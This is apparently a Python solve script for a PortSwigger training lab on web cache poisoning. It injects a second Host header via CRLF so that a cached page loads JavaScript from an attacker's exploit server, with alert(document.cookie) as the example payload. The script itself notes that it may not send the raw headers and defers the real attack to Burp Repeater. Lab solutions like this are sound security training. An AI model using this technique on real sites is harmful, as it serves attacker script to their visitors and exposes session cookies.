#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Web cache poisoning via ambiguous requests.

The app reflects the second Host header in the script src URL.
The cache keys on the first Host header.
Full browser headers are required — a minimal request with duplicate Host headers gets 400.

Steps:
  1. Set up exploit server with /resources/js/tracking.js → alert(document.cookie)
  2. Send request with two Host headers until X-Cache: hit
  3. Victim visits homepage → exploit server JS runs
"""

import argparse
import time
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def poison_cache(lab, exploit_server, session_cookie, lab_cookie, max_attempts=30):
    lab_host = lab.replace("https://", "").replace("http://", "").rstrip("/")

    # Must use full browser headers — minimal requests get 400 for duplicate Host
    headers = {
        "Host": f"{lab_host}\r\nHost: {exploit_server}",  # inject via CRLF if needed
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Dest": "document",
        "Referer": f"https://{exploit_server}/",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }
    cookies = {"session": session_cookie, "_lab": lab_cookie}

    print(f"[*] Poisoning cache with exploit server: {exploit_server}")
    print(f"[!] NOTE: requests library may not support raw duplicate headers.")
    print(f"[!] Use Burp Repeater for the actual attack — this script demonstrates the logic.\n")

    for i in range(1, max_attempts + 1):
        r = requests.get(lab, headers=headers, cookies=cookies, verify=False)
        cache = r.headers.get("X-Cache", "none")
        print(f"[{i:3d}] X-Cache={cache}  Status={r.status_code}")
        if cache == "hit":
            if exploit_server in r.text:
                print(f"[+] Cache poisoned! Exploit server reflected in response.")
            return True
        time.sleep(0.5)
    return False


def main():
    parser = argparse.ArgumentParser(
        description="Solve Web Cache Poisoning via Ambiguous Requests lab"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("exploit_server", help="Exploit server hostname (no https://)")
    parser.add_argument("session", help="session cookie value")
    parser.add_argument("lab_cookie", help="_lab cookie value")
    args = parser.parse_args()

    print("[!] This lab requires raw duplicate Host headers.")
    print("[!] Use Burp Repeater with full browser headers for the real attack.")
    print("[!] Exploit server must serve alert(document.cookie) at /resources/js/tracking.js\n")

    poison_cache(
        args.lab_url.rstrip("/"),
        args.exploit_server,
        args.session,
        args.lab_cookie,
    )


if __name__ == "__main__":
    main()
